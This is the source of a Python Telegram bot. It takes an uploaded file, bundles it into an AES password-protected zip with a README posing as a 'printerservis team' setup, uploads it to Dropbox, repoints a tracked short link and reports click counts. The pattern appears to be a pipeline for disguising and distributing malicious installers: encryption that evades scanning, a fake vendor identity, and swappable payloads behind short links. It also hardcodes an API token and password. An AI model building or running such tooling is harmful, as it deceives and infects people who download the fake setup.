import os
import shutil
import pyzipper
import aiohttp
from aiogram import F, Bot, types
from aiogram.fsm.context import FSMContext
from commands import commands_router
from states import UserActionState
from aiogram.types import ContentType
from aiogram.types.input_file import FSInputFile

from upload import upload_and_update_link

PASSWORD = '~v6m3NHb7*7p'
API_TOKEN = '3crKqpO2BG4AKGzQOMQ4WaWiq9i0hj0tsB9mrEihprYporen4IC9kJp7BHs3'

def create_password_protected_archive(folder_to_archive, archive_name, password):
    with pyzipper.AESZipFile(archive_name, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zip_file:
        zip_file.setpassword(password.encode())
        for root, _, files in os.walk(folder_to_archive):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, folder_to_archive)
                zip_file.write(file_path, arcname=arcname)

@commands_router.message(UserActionState.menu)
async def user_actions_buttons(message: types.Message, state: FSMContext):
    archive = message.text
    if archive not in ["printerservis.net", "2 вариант архива", "3 вариант архива", "статистика"]:
        await message.answer("выбери блять из меню")
        return
    if archive == "статистика":
        await send_statistics(message)
        return
    await state.update_data(chosen_folder=archive)
    await message.answer("ok")
    await state.set_state(UserActionState.waiting_for_document)

async def send_statistics(message: types.Message):
    url = 'https://goo.su/api/links'
    headers = {
        'X-Goo-Api-Token': API_TOKEN
    }
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                links = data.get("links", [])
                statistics = []
                for link in links:
                    title = link.get("title", "No title")
                    hits = link.get("hits", 0)
                    statistics.append(f"ссылка: {title}, клики: {hits}")
                stats_message = "\n".join(statistics) if statistics else "No links found."
                await message.answer(stats_message)
            else:
                await message.answer("Failed to retrieve statistics.")

@commands_router.message(UserActionState.waiting_for_document, F.content_type == ContentType.DOCUMENT)
async def process_file(message: types.Message, state: FSMContext, bot: Bot):
    print("Processing file...")
    user_data = await state.get_data()
    folder_name = user_data['chosen_folder']

    file_id = message.document.file_id
    file_info = await bot.get_file(file_id)
    file_path = file_info.file_path
    downloaded_file = await bot.download_file(file_path)

    temp_dir = os.path.join('temp', 'archive')
    os.makedirs(temp_dir, exist_ok=True)

    local_file_path = os.path.join(temp_dir, message.document.file_name)
    with open(local_file_path, 'wb') as new_file:
        new_file.write(downloaded_file.getvalue())

    src_dir = os.path.join(folder_name)
    for item in os.listdir(src_dir):
        s = os.path.join(src_dir, item)
        d = os.path.join(temp_dir, item)
        if os.path.isdir(s):
            shutil.copytree(s, d, dirs_exist_ok=True)
        else:
            shutil.copy2(s, d)

    protected_archive_path = os.path.join('temp', 'protected_archive.zip')
    create_password_protected_archive(temp_dir, protected_archive_path, PASSWORD)

    final_temp_dir = os.path.join('temp', 'final')
    os.makedirs(final_temp_dir, exist_ok=True)

    readme_content = """Thanks for choosing us!

We appreciate your visit.

Password for the archive with setup: ~v6m3NHb7*7p

Best regards,
printerservis team."""
    readme_path = os.path.join(final_temp_dir, 'README.txt')
    with open(readme_path, 'w') as readme_file:
        readme_file.write(readme_content)

    shutil.copy(protected_archive_path, os.path.join(final_temp_dir, os.path.basename(protected_archive_path)))

    final_archive_path = os.path.join('temp', 'final_archive.zip')
    with pyzipper.AESZipFile(final_archive_path, 'w', compression=pyzipper.ZIP_DEFLATED) as final_zip:
        for root, _, files in os.walk(final_temp_dir):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, final_temp_dir)
                final_zip.write(file_path, arcname=arcname)

    document = FSInputFile(final_archive_path)
    await bot.send_document(chat_id=message.chat.id, document=document, caption="гружу в облако и зменяю ссылку")

    alias_dict = {
        "printerservis.net": "tUaRyvW",
        "2 вариант архива": "AliasFor2Variant",
        "3 вариант архива": "AliasFor3Variant"
    }
    
    alias = alias_dict.get(folder_name)

    if alias:
        uploaded_link = upload_and_update_link(final_archive_path, alias)
        if uploaded_link:
            await message.answer(f"успех!")
        else:
            await message.answer("Failed to upload the file to Dropbox and update the short link.")
    else:
        await message.answer("Invalid archive selection, could not update the link.")

    shutil.rmtree(temp_dir)
    shutil.rmtree(final_temp_dir)
    os.remove(protected_archive_path)
    os.remove(final_archive_path)

    await state.set_state(UserActionState.menu)
